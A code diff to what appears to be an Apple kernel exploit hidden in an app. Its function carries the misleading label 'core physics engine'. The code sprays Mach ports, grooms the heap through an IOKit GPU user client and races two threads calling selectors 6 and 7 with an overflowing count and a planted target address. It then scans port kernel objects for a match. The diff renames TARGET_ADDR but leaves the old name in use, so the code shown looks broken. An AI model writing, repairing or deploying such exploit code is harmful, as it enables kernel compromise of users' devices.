@@ -37,7 +37,7 @@ extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
 
 #define NUM_PORTS        5000
 #define NUM_SOCKETS      200
-#define TARGET_ADDR  0x0000000FFFFFC330ULL
+#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
 #define GROOM_COUNT 1024
 #define RACE_ITERS       80000
 
@@ -99,7 +99,7 @@ static void scan_background(void) {
     for (int i = 0; i < g_port_count; i++) {
         if (g_found) break;
         natural_t kotype = 0; mach_vm_address_t kobject = 0;
-        kern_return_t kr = port_query(mach_task_self(), g_ports[i], &kotype, &kobject);
+        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
         if (kr != KERN_SUCCESS) continue;
 
         if (kobject == TARGET_ADDR) {
@@ -177,7 +177,7 @@ static kern_return_t sel7_q(io_connect_t conn, uint32_t gid) {
 
 /* core physics engine */
 static void do_f109(io_connect_t conn) {
-    ev("PHASE START groom=%d", GROOM_COUNT);
+    ev("PH START groom=%d", GROOM_COUNT);
 
     /* Phase A: groom heap with 104-byte groups (count=4, element_size=24) */
     uint32_t gids[GROOM_COUNT];
@@ -231,47 +231,49 @@ static void do_f109(io_connect_t conn) {
         /* Snapshot gids into two heap copies — one per thread to avoid UAF */
         uint32_t *race_gids_a = malloc(ngids * sizeof(uint32_t));
         uint32_t *race_gids_b = malloc(ngids * sizeof(uint32_t));
-        if (!race_gids_a || !race_gids_b) { free(race_gids_a); free(race_gids_b); goto d_done; }
-        memcpy(race_gids_a, gids, ngids * sizeof(uint32_t));
-        memcpy(race_gids_b, gids, ngids * sizeof(uint32_t));
-        int race_ngids = ngids;
+        if (race_gids_a && race_gids_b) {
+            memcpy(race_gids_a, gids, ngids * sizeof(uint32_t));
+            memcpy(race_gids_b, gids, ngids * sizeof(uint32_t));
+            int race_ngids = ngids;
 
-        __block io_connect_t race_conn = conn;
-        __block _Atomic int  race_stop = 0;
+            __block io_connect_t race_conn = conn;
+            __block _Atomic int  race_stop = 0;
 
-        /* Thread A: sel=7 (group lifecycle / repack op) round-robin all groups */
-        dispatch_queue_t qa = dispatch_queue_create("f109.a", DISPATCH_QUEUE_CONCURRENT);
-        dispatch_async(qa, ^{
-            for (int i = 0; i < RACE_ITERS && !race_stop && !g_found; i++)
-                sel7_q(race_conn, race_gids_a[i % race_ngids]);
-            free(race_gids_a);
-            atomic_store(&race_stop, 1);
-        });
+            /* Thread A: sel=7 (group lifecycle / repack op) round-robin all groups */
+            dispatch_queue_t qa = dispatch_queue_create("f109.a", DISPATCH_QUEUE_CONCURRENT);
+            dispatch_async(qa, ^{
+                for (int i = 0; i < RACE_ITERS && !race_stop && !g_found; i++)
+                    sel7_q(race_conn, race_gids_a[i % race_ngids]);
+                free(race_gids_a);
+                atomic_store(&race_stop, 1);
+            });
 
-        /* Thread B: sel=6 count=-1 round-robin all groups (add-to-existing) */
-        dispatch_queue_t qb = dispatch_queue_create("f109.b", DISPATCH_QUEUE_CONCURRENT);
-        dispatch_async(qb, ^{
-            uint8_t *rs = calloc(1, SGAR_STRUCT_SIZE);
-            uint8_t ro[0x10]; size_t ro_sz = sizeof(ro); uint32_t rc = 0;
-            if (!rs) { atomic_store(&race_stop, 1); return; }
-            *(uint32_t *)(rs + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
-            for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
-                *(uint64_t *)(rs + off) = TARGET_ADDR;
-            int wins = 0;
-            for (int i = 0; i < RACE_ITERS && !race_stop && !g_found; i++) {
-                uint32_t tgt = race_gids_b[i % race_ngids];
-                *(uint32_t *)(rs + 0x00) = tgt;
-                *(uint32_t *)(rs + 0x04) = tgt;
-                kern_return_t kr = IOConnectCallMethod(race_conn, SGAR_SELECTOR,
-                    NULL, 0, rs, SGAR_STRUCT_SIZE, NULL, &rc, ro, &ro_sz);
-                if (kr == KERN_SUCCESS) wins++;
-            }
-            free(rs);
-            free(race_gids_b);
-            ev("PH_D RACE_B wins=%d", wins);
-            atomic_store(&race_stop, 1);
-        });
-        d_done:;
+            /* Thread B: sel=6 count=-1 round-robin all groups (add-to-existing) */
+            dispatch_queue_t qb = dispatch_queue_create("f109.b", DISPATCH_QUEUE_CONCURRENT);
+            dispatch_async(qb, ^{
+                uint8_t *rs = calloc(1, SGAR_STRUCT_SIZE);
+                uint8_t ro[0x10]; size_t ro_sz = sizeof(ro); uint32_t rc = 0;
+                if (!rs) { atomic_store(&race_stop, 1); return; }
+                *(uint32_t *)(rs + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
+                for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
+                    *(uint64_t *)(rs + off) = TARGET_ADDR;
+                int wins = 0;
+                for (int i = 0; i < RACE_ITERS && !race_stop && !g_found; i++) {
+                    uint32_t tgt = race_gids_b[i % race_ngids];
+                    *(uint32_t *)(rs + 0x00) = tgt;
+                    *(uint32_t *)(rs + 0x04) = tgt;
+                    kern_return_t kr = IOConnectCallMethod(race_conn, SGAR_SELECTOR,
+                        NULL, 0, rs, SGAR_STRUCT_SIZE, NULL, &rc, ro, &ro_sz);
+                    if (kr == KERN_SUCCESS) wins++;
+                }
+                free(rs);
+                free(race_gids_b);
+                ev("PH_D RACE_B wins=%d", wins);
+                atomic_store(&race_stop, 1);
+            });
+        } else {
+            free(race_gids_a); free(race_gids_b);
+        }
     }
 
     ev("PH phases launched (scan loop detects port state)");
@@ -311,7 +313,7 @@ static void do_f109(io_connect_t conn) {
     /* Open GPU connection synchronously — needed before overflow */
     self.gpuConn = open_gpu_conn();
 
-    /* Scan loop: 100ms tick, detects port state via port_query */
+    /* Scan loop: 100ms tick, detects port state via mach_port_kobject */
     [NSTimer scheduledTimerWithTimeInterval:0.10
                                      target:self
                                    selector:@selector(scanTick:)
@@ -338,7 +340,7 @@ static void do_f109(io_connect_t conn) {
 
 - (void)fireF109:(NSTimer *)t {
     if (!self.gpuConn) {
-        ev("PH_SKIP: no GPU conn");
+        ev("PH SKIP: no GPU conn");
         return;
     }
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
